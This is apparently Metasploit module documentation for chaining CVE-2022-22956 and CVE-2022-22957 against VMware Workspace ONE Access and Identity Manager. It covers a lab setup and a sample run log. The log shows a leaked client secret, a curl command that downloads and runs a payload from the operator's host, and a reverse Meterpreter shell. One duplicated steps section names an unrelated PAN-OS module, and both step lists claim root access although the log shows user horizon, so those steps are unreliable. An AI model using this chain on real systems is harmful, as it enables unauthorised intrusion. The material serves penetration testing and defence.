## Vulnerable Application

This module combines two vulnerabilities in order achieve remote code execution in the context of the `horizon` user.
The first vulnerability CVE-2022-22956 is an authentication bypass in OAuth2TokenResourceController ACS which allows
a remote, unauthenticated attacker to bypass the authentication mechanism and execute any operation. The second
vulnerability CVE-2022-22957 is a JDBC injection RCE specifically in the DBConnectionCheckController class's dbCheck 
method which allows an attacker to deserialize arbitrary Java objects which can allow remote code execution.

CVE-2022-22956 & CVE-2022-22957:

| Vulnerable Application  | Vulnerable version  |
|---|---|
| VMware Workspace ONE Access (Access)   |  21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0  |
| VMware Identity Manager (vIDM)  |  3.3.6, 3.3.5, 3.3.4, 3.3.3  |
| VMware vRealize Automation (vRA)  |  8.x, 7.6  |
| VMware Cloud Foundation | 4.x | 
| vRealize Suite Lifecycle Manager | 8.x |

### Setup

In order to download a vulnerable application you do need VMware Customer Connect credentials. Navigate to
[Download VMware Workspace ONE Access (VIDM)](https://customerconnect.vmware.com/downloads/info/slug/desktop_end_user_computing/vmware_workspace_one_access_vidm/20_10).
to download the OVA file.
During VM Configuration within VMware Fusion, in Addition Settings input the following:

#### Application:

Timezone: (timezone of your choice)

Join the VMware Custom Experience Improvement Program: (deselect)

#### Networking Properties: (note the following may depend on your network configuration)

Host Name (FQDN): access01.corp.local

Default Gateway: 192.168.123.1

Domain Name: (blank)

Domain Search Path: (blank)

DNS: 192.168.123.1

IP Address: 192.168.123.16
Network: 255.255.255.0

Add the following line to your `/etc/hosts` file:
`192.168.123.16 access.test.local`

Be sure to change the network adapter of the VM to the network adapter that corresponds to the subnet of the static IP address you assigned above.

#### GUI Setup

Once running navigate to https://access.test.local:8443/cfg/setup
in order to complete the following setup requirements:

Set Passwords
- Appliance Administrator Account
- Appliance Root Account
- Remote User Account

Select Database
- Database Type: Internal Database


## Verification Steps

1. Start msfconsole
1. Do: `use exploit/linux/http/panos_auth_rce`
1. Set the `RHOST`, `USERNAME`, and `PASSWORD` options
1. Run the module
1. Receive a Meterpreter session as the `root` user.

## Verification Steps

1. Start msfconsole
1. Do: `use linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain`
1. Set the `RHOST`, `LHOST` and `TARGET` options
1. Run the module
1. Receive a Meterpreter session as the `root` user.

## Scenarios
### VMware Identity Manager 21.08.0.1-19010796
```
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > set rhosts 192.168.123.16
rhosts => 192.168.123.16
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > set lhost 192.168.123.1
lhost => 192.168.123.1
msf6 exploit(linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain) > run

[*] Started reverse TCP handler on 192.168.123.1:4447
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked client_id: acs
[+] Leaked client_secret: Oh2CB8n8PSrBER3NwXs41AaY3D49G7mt
[+] Access_token obtained, CVE-2022-22956 has been exploited successfully
[+] The target is vulnerable.
[*] Using URL: http://192.168.123.1:8085/JOqR.xml
[*] Using URL: http://192.168.123.1:8085/jiMSQBCq6
[*] Executing the following cmd: curl -so /tmp/kNLOSgVZ http://192.168.123.1:8085/jiMSQBCq6;chmod +x /tmp/kNLOSgVZ;/tmp/kNLOSgVZ;rm -f /tmp/kNLOSgVZ
[*] Sending stage (3045348 bytes) to 192.168.123.16
[+] Now use exploits/linux/local/vmware_workspace_one_access_cve_2022_22960.rb to get a root shell
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Meterpreter session 13 opened (192.168.123.1:4447 -> 192.168.123.16:48358) at 2023-04-05 16:27:20 -0400

meterpreter > getuid
Server username: horizon
meterpreter > sysinfo
Computer     : access01.corp.local
OS           : VMware Photon OS 3.0 (Linux 4.19.217-1.ph3)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
